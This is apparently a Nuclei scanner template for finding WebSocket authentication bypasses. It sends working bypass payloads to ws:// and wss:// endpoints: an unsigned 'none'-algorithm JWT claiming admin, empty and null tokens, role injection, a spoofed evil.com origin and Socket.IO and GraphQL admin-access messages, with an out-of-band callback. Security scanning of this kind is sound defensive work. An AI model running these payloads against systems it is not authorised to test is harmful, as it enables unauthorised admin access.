id: websocket-auth-bypass-real

info:
  name: WebSocket Authentication Bypass with Real Connection Testing
  author: geeknik
  severity: critical
  description: |
    Detects ACTUAL WebSocket authentication bypasses by establishing real WebSocket
    connections and testing various authentication bypass techniques including
    missing origin validation, token manipulation, and protocol downgrade.
  reference:
    - https://portswigger.net/web-security/websockets
    - https://tools.ietf.org/html/rfc6455
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N
    cvss-score: 9.3
    cwe-id: CWE-287,CWE-346
  tags: websocket,auth-bypass,critical,real

variables:
  callback: "{{interactsh-url}}"
  bypass_id: "{{randstr}}"

websocket:
  - address: "ws://{{Hostname}}/ws"

    inputs:
      # Test 1: No authentication
      - data: '{"type":"connect","user":"admin"}'

      # Test 2: Empty token
      - data: '{"type":"auth","token":""}'

      # Test 3: Null token
      - data: '{"type":"auth","token":null}'

      # Test 4: Admin role injection
      - data: '{"type":"login","user":"guest","role":"admin"}'

      # Test 5: JWT none algorithm
      - data: '{"type":"auth","jwt":"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9."}'

      # Test 6: Origin bypass callback
      - data: '{"type":"validate","callback":"{{callback}}/ws-{{bypass_id}}"}'

    matchers-condition: or
    matchers:
      - type: word
        part: response
        words:
          - '"authenticated":true'
          - '"role":"admin"'
          - '"success":true'
          - 'Welcome admin'

      - type: word
        part: interactsh_protocol
        words:
          - "http"
          - "dns"

  - address: "wss://{{Hostname}}/ws"
    origin: "https://evil.com"

    inputs:
      # Test origin validation bypass
      - data: '{"type":"connect","origin":"evil.com"}'

    matchers:
      - type: word
        part: response
        words:
          - "connected"
          - "authenticated"
        negative: false

  - address: "ws://{{Hostname}}/socket.io/?transport=websocket"

    inputs:
      # Socket.IO specific bypass
      - data: '42["authenticate",{"token":"bypass","admin":true}]'
      - data: '42["join",{"room":"admin","bypass":true}]'

    matchers:
      - type: regex
        part: response
        regex:
          - '43\["authenticated"'
          - '"sid":"[a-zA-Z0-9]+"'

  - address: "ws://{{Hostname}}/graphql-ws"

    inputs:
      # GraphQL subscription bypass
      - data: '{"type":"connection_init","payload":{"authorization":""}}'
      - data: '{"type":"start","payload":{"query":"subscription { adminData }"}}'

    matchers:
      - type: word
        part: response
        words:
          - "connection_ack"
          - '"data":'